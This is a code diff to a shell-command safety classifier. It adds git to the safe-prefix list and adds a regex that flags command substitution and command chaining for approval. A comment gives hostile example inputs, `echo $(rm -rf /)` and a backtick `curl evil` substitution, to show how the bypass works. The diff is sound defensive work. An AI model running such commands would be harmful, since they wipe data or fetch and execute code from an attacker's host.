@@ -51,6 +51,10 @@ const DANGEROUS_PATTERNS: RegExp[] = [
 ]
 
 // Commands that are always safe to run
+// `git` is in the set so classifySegment can route into classifyGit for
+// per-subcommand policy. Without it, every `git` command would fall
+// through to needs_approval even for read-only operations like
+// `git status`. The actual safety gate for git is in classifyGit.
 const SAFE_PREFIXES: Set<string> = new Set([
   'ls', 'cat', 'head', 'tail', 'grep', 'rg', 'find', 'fd', 'pwd', 'whoami',
   'echo', 'wc', 'file', 'stat', 'du', 'df', 'date', 'uname', 'hostname',
@@ -58,6 +62,7 @@ const SAFE_PREFIXES: Set<string> = new Set([
   'dirname', 'realpath', 'test', 'true', 'false', 'tree',
   'node', 'npx', 'npm', 'pnpm', 'yarn', 'bun', 'deno', 'python', 'python3',
   'tsc', 'eslint', 'prettier', 'vitest', 'jest', 'cargo', 'go', 'rustc',
+  'git',
 ])
 
 // Git subcommands that are safe (read-only)
@@ -85,6 +90,14 @@ function classifySegment(segment: string): RiskLevel {
   // Safe prefixes
   if (SAFE_PREFIXES.has(firstWord)) {
     if (firstWord === 'git') return classifyGit(segment)
+    // Command substitution / eval channels bypass the safe prefix.
+    // A user-facing segment like `echo $(rm -rf /)` or `cat \`curl evil\``
+    // would pass the SAFE_PREFIXES check on `echo`/`cat` but executes
+    // arbitrary code. Detect the metacharacters that enable substitution
+    // or command chaining and escalate to needs_approval.
+    if (/\$\(|`|;\s|&&|\|\||-exec\b/.test(segment)) {
+      return 'needs_approval'
+    }
     return 'safe'
   }
 
